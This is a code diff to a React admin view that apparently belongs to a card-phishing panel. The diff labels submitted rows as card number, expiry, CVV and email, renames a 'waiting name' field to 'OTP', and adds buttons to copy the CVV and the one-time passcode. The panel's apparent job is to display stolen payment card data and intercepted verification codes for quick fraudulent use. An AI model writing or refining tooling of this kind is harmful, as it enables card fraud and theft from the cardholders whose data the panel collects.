@@ -347,7 +347,7 @@ async function copyText(value: string) {
         </table>
       </div>
 
-     {/* Mobile */}
+    {/* Mobile */}
 <div className="mt-8 space-y-3 md:hidden">
   {rows.length === 0 && (
     <p className="text-[#9aa8b8]">No submissions yet.</p>
@@ -364,20 +364,20 @@ async function copyText(value: string) {
       </p>
 	  
       <div className="flex items-start justify-between gap-2">
-        <p className="font-medium break-words">{row.first_name}</p>
+        Name: <p className="font-medium break-words">{row.first_name}</p>
         <span className="shrink-0 capitalize text-[#9aa8b8]">{row.status}</span>
       </div>
 	  
-	  <p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
+	  Card number:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
 	  
-	  <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
+	  Expiry: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
 	  
-	  <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
+	 CVV: <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
 
-      <p className="mt-1 break-all text-[#9aa8b8]">{row.email}</p>
+      Email: <p className="mt-1 break-all text-[#9aa8b8]">{row.email}</p>
       
       {row.waiting_name && (
-        <p className="mt-2 break-words">Waiting name: {row.waiting_name}</p>
+        <p className="mt-2 break-words">OTP: {row.waiting_name}</p>
       )}
 
       <div className="mt-3 flex flex-wrap gap-2">
@@ -407,7 +407,7 @@ async function copyText(value: string) {
           className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
           onClick={() => copyText(row.security_code)}
         >
-          Copy security_code
+          Copy CVV
         </button>
 		<button
           type="button"
@@ -415,6 +415,13 @@ async function copyText(value: string) {
           onClick={() => copyText(row.email)}
         >
           Copy email
+        </button>
+		<button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.waiting_name)}
+        >
+          Copy OTP
         </button>
       </div>
 
